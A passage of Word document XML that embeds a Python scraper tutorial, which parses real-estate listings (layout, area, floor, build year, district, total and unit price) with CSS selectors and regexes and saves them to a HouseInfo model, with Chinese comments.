      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>无电梯</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4FB8EB"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house_info = li.select('div[class="houseInfo"]')[0].get_text()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C21871F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                house_info_list = house_info.split(" | ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A26EEE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C7BFE21" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['house'] = house_info_list[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B168CAE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['bedroom'] = house_info_list[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736CE476" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['area'] = house_info_list[2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22784D15" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['direction'] = house_info_list[3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBAC2F5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12FE4519"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低楼层</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>共</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>层</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)2006</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>年建板楼</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  -  </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>张江</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>提取楼层，年份和板块</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0068C1EF"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position_info = li.select('div[class="positionInfo"]')[0].get_text().split(' - ')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E7A5D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39DF7C98" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                floor_pattern = re.compile(r'.+\)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304D53C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                match1 = re.search(floor_pattern, position_info[0])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串任意位置匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6B739B"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if match1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C40805" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    detail['floor'] = match1.group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29857F66" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F08BEC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    detail['floor'] = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未知</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5F46DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01D3B7BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['floor'] = re.search(floor_pattern, position_info[0]).group()  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串头部开始匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E17B279" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C1AD020" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>year_pattern = re.compile(r'\d{4}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C551FE2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                match2 = re.search(year_pattern, position_info[0])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串任意位置匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EEAB7F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if match2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507A0C5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    detail['year'] = match2.group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391B2A67" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E085CFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    detail['year'] = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未知</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386DC4A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['location'] = position_info[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0459E54E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33B9343F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                # 650</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万，匹配</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>650</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C695DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                price_pattern = re.compile(r'\d+')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BC0E52" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                total_price = li.select('div[class="totalPrice"]')[0].get_text()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7E46C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['total_price'] = re.search(price_pattern, total_price).group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5842145A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F2A53C6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>单价</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>64182</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>元</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>平米， 匹配</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>64182</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC57D41" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                unit_price = li.select('div[class="unitPrice"]')[0].get_text()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D82C5EB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['unit_price'] = re.search(price_pattern, unit_price).group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1057017B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.data.append(detail)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6643F97E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EA6316D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def save_data_to_model(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1B3B3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        for item in self.data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135D975A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item = HouseInfo()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D00DBE9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.title = item['title']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD5E5C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.house = item['house']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222E774F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.bedroom = item['bedroom']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E0B235" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.area = item['area']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6BA6E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.direction = item['direction']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF727CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.floor = item['floor']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E2C343" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.year = item['year']</w:t>
      </w:r>
    </w:p>
